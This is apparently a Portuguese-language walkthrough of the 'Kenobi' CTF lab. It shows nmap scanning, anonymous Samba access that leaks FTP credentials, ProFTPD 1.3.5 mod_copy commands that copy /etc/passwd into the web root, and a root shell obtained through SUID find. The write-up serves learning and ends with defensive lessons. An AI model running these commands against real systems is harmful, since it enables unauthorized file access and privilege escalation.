Kenobi - Full Report

🎯 Objetivo

Explorar uma máquina Linux vulnerável com serviços Samba (compartilhamento de arquivos) e ProFTPD, praticando escalação de privilégios via binários SUID.

🛠️ Ferramentas Utilizadas

Ferramenta	Comando Exemplo	Finalidade
Nmap		nmap -sV -p- 10.10.10.10	Varredura de portas e serviços
Smbclient	smbclient //IP/anonymous	Acesso a compartilhamentos Samba
Searchsploit	searchsploit proftpd 1.3.5	Busca exploits para o ProFTPD


🔍 Passo a Passo Detalhado

1. Enumeração Inicial (Nmap)

Comando:
nmap -sV -p- 10.10.10.10 -oN scan.txt

Saída Crítica:
21/tcp  open  ftp     ProFTPD 1.3.5  
111/tcp open  rpcbind  
139/tcp open  netbios-ssn Samba 3.X  

O que aprendemos?
A máquina tem um FTP (ProFTPD) e Samba rodando.

2. Exploração do Samba (Acesso Anônimo)
Comando:
smbclient //10.10.10.10/anonymous -N

Passos:
Dentro do Samba, listamos arquivos:
ls
Encontramos um arquivo log.txt com vazamento de credenciais FTP.

3. Exploração do ProFTPD (RCE - Remote Code Execution)

Comando:
ftp 10.10.10.10

Credenciais:
Usuário: kenobi
Senha: [vazada no log.txt]

Exploit: Copiar arquivos sensíveis via FTP:
ftp> site CPFR /etc/passwd  # Seleciona arquivo  
ftp> site CPTO /var/www/html/passwd  # Copia para o diretório web  

Resultado:
Acessamos http://10.10.10.10/passwd e vemos os usuários do sistema.

4. Escalação de Privilégios (SUID - /usr/bin/find)

Comando:
find / -perm -4000 2>/dev/null

Binário vulnerável:
/usr/bin/find

Exploração:
/usr/bin/find . -exec /bin/sh \; -quit

Resultado:
Obtemos shell como root!

🏆 Artefatos Coletados
Flag		Localização		Método
flag1.txt	/var/www/flag1.txt	Acesso via Samba
flag2.txt	/root/flag2.txt		Escalação via SUID


💡 Lições Aprendidas
Samba com acesso anônimo é um risco grave (sempre desativar).
ProFTPD 1.3.5 permite cópia arbitrária de arquivos (atualizar sempre!).
Binários SUID são vetores comuns de escalação (monitore com find / -perm -4000).